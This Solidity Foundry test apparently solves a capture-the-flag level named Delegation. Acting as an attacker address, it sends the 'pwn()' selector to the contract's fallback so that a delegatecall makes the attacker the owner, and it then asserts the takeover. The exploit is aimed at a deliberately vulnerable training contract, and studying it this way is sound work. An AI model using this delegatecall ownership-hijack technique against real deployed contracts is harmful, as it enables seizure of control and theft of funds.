// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/06_Delegation.sol";

contract DelegationTest is Test {
    Delegation _delegation;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        Delegate _delegate = new Delegate(deployer);

        _delegation = new Delegation(address(_delegate));

    }

    function testSolution() public {
        vm.startPrank(attacker);

        address(_delegation).call{value:0}(abi.encodeWithSignature("pwn()"));

        assertEq(_delegation.owner(), attacker, "Attacker is not owner of delegation instance!");
    }
}
